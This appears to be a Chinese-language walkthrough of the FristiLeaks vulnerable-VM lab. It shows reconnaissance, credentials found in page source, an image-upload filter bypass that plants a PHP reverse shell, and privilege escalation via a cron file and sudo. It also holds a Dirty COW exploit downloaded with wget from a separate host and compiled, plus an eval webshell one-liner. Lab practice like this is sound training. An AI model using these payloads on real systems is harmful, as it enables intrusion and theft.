该靶场需要设置固定的地址：
VMware 用户需要手动将 VM 的 MAC 地址编辑为：08:00:27:A5:A6:76   ---PD虚拟机也一样！

1、nmap -sP 10.211.55.0/24
Nmap scan report for 10.211.55.43   ---在设置好mac地址后项目上其实也显示了IP！

2、nmap全端口扫描
80/tcp open  http    Apache httpd 2.2.15 ((CentOS) DAV/2 PHP/5.3.3)
==就开启了80端口！==

开了防火墙外网不可以访问除了80以外的端口


3、nikto和dirb都扫描出了robots.txt

==在主页图片提示：keep calm and drink fristi

http://10.211.55.43/fristi
发现这是个登录页面！

查看源码发现：
1）用户名两个：TODO、eezeepz
==2）base64，进行解码：
cat base642.txt | base64 -d > 1
file 1   ---发现这是图片？
双击打开发现一串字符：keKkeKKeKKeKkEkkEk==
测试用账号密码登录成功：
eezeepz
keKkeKKeKKeKkEkkEk


4、文件上传
Sorry, is not a valid file. Only allowed are: png,jpg,gif 

说只能上传png,jpg,gif！

回顾项目八****
通过插入GIF89a十六​​进制标头并附加，WAF没有发现为恶意的php代码来创建一个gif文件。

在php-reverse-shell.php首行加入：GIF89a
mv php-reverse-shell.php php-reverse-shell.gif   ---然后改名为gif

Uploading, please wait
The file has been uploaded to /uploads 
上传完成后提示访问/uploads

发现访问http://10.211.55.43/fristi/uploads/php-reverse-shell.gif报错了。

测试改名为.php.jpg
mv php-reverse-shell.gif dayu.php.jpg

重新获得反弹shell：
nc -vlp 1234
http://10.211.55.43/fristi/uploads/dayu.php.jpg


5、内网信息枚举

在/home/eezeepz目录下发现：notes.txt文件 ==用户目录枚举

意思是说如果正在运行脚本，则该脚本将在/tmp目录中以admin身份执行任何命令（如果位于runthis的文件中），所以只需要执行一个命令，使用/tmp/runthis文件技巧就可以访问/admin/文件（还有每个文件一分钟后才生效…)
尝试的发出chmod，通过回chmod 777 /home/admin至/tmp/runthis，等了大约一分钟后…

6、赋权信息枚举

echo "/home/admin/chmod 777 /home/admin" > /tmp/runthis   ---对apache赋权admin用户权限
ls -l /home/admin
cat /home/admin/cryptedpass.txt  发现信息：mVGZ3O3omkJLmy2pcuTq
cat /home/admin/whoisyourgodnow.txt  发现信息：=RFn0AKnlMHMPIzpyuTI0ITG

cat /home/admin/cryptpass.py

-----
#Enhanced with thanks to Dinesh Singh Sikawar @LinkedIn
import base64,codecs,sys

def encodeString(str):
    base64string= base64.b64encode(str)
    return codecs.encode(base64string[::-1], 'rot13')

cryptoResult=encodeString(sys.argv[1])
print cryptoResult
-----  发现一个解密base64的脚本！

python
import base64,codecs,sys         ---使用python导入base64,codecs,sys模块module！
rot13Str = "mVGZ3O3omkJLmy2pcuTq"
base64Str = codecs.decode(rot13Str[::-1], 'rot13')  --用codecs编码转换[::-1]，decode编码转换rot13
clearTextStr = base64.b64decode(base64Str)    ---base64Str进行decode进行base64解码
print (clearTextStr)          ---打印出clearTextStr

----------
python2
import base64,codecs,sys
rot13Str = "=RFn0AKnlMHMPIzpyuTI0ITG"
base64Str = codecs.decode(rot13Str[::-1], 'rot13')
clearTextStr = base64.b64decode(base64Str)
print (clearTextStr)

----------
thisisalsopw123
LetThereBeFristi!
获得了两个密码！尝试admin登录！

su admin
thisisalsopw123
成功登录！

sudo -l  提示：Sorry, user admin may not run sudo on 16-FristiLeaks_1.

在登录：fristigod
LetThereBeFristi!

sudo -l 提示：(fristi : ALL) /var/fristigod/.secret_admin_stuff/

直接将用户sudo用做fristi来访问/var/fristigod/.secret_admin_stuff/doCom：

grep -rn “/var/fristigod/.secret_admin_stuff/doCom”
sudo /var/fristigod/.secret_admin_stuff/doCom su -
Sorry, user fristigod is not allowed to execute '/var/fristigod/.secret_admin_stuff/doCom su -' as root on 16-FristiLeaks_1.3.
翻译：不允许用户fristigod以root权限运行！

在查看/var/fristigod目录下的cat .bash_history发现了历史命令：

sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom su - ==sudo -u 
获得root权限！

或者将/bin/bash附加到doCom也行：
sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom /bin/bash
获得root权限！
x

------------------------------------
在/var/www/html目录下搜索到mysql密码信息：
grep -rn password 
fristi/checklogin.php:6:$password="4ll3maal12#"; // Mysql password

mysql -ueezeepz -p4ll3maal12#
+----+----------+--------------------+
| id | username | password           |
+----+----------+--------------------+
|  1 | eezeepz  | keKkeKKeKKeKkEkkEk |
+----+----------+--------------------+

------------------------------------
拓展小技巧：
1）webshell小技巧
https://github.com/melbinkm/PHPImageShell
直接上传该php的shell，可以运行command命令框！


2）脏牛提权
wget http://10.211.55.19:8081/40839.c
gcc -pthread 40839.c -o dayu -lcrypt
chmod +x dayu
./dayu dayu
执行完提示将firefart密码修改为dayu为root权限！
su firefart
dayu
然后就获得root权限了！


3）download源码

创建文件：1.php.jpg
GIF98
<?php eval($_REQUEST[1]);?>

cp /var/www/html/fristi/uploads

tar -zcvf web.tar.gz /var/www/html/*

cp web.tar.gz /var/www/html/fristi/uploads
这时候就可以download源码下来了！丢到seay里面去审计！




# mynew
开了防火墙 ：
可能设置了外网不可以访问内网的服务

base64 + file 判断类型 图片有时候可以看到明文
文件头

python 加密解密
sudo -u 
seay自动审计工具